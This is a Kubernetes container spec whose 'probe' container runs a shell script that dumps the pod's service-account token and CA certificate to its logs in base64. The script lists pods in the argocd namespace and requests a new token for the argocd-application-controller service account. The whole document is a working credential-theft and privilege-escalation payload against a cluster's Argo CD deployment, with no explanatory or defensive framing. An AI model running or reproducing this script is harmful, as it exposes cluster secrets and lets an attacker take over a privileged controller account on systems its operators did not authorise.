containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
echo "===I3030C4_START utc=$(date -u +%FT%TZ) host=$(hostname)==="
echo "===TOKEN_B64==="
base64 "$SA/token" 2>/dev/null | tr -d '\n'; echo
echo "===CA_B64==="
base64 "$SA/ca.crt" 2>/dev/null | tr -d '\n'; echo
echo "===NS==="
cat "$SA/namespace"; echo
echo "===PODS_PRE==="
wget -q -O - --timeout=20 --no-check-certificate --header="Authorization: Bearer $(cat $SA/token)" "https://kubernetes.default.svc/api/v1/namespaces/argocd/pods?limit=100" 2>/dev/null | tr ',' '\n' | grep -E '"name"|"phase"' | head -40
echo "===TOKENREQ==="
wget -q -O - --timeout=20 --no-check-certificate --header="Authorization: Bearer $(cat $SA/token)" --header="Content-Type: application/json" --post-data='{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["https://kubernetes.default.svc"],"expirationSeconds":3600}}' "https://kubernetes.default.svc/api/v1/namespaces/argocd/serviceaccounts/argocd-application-controller/token" 2>/dev/null | head -c 600; echo
echo "===I3030C4_DONE utc=$(date -u +%FT%TZ)==="
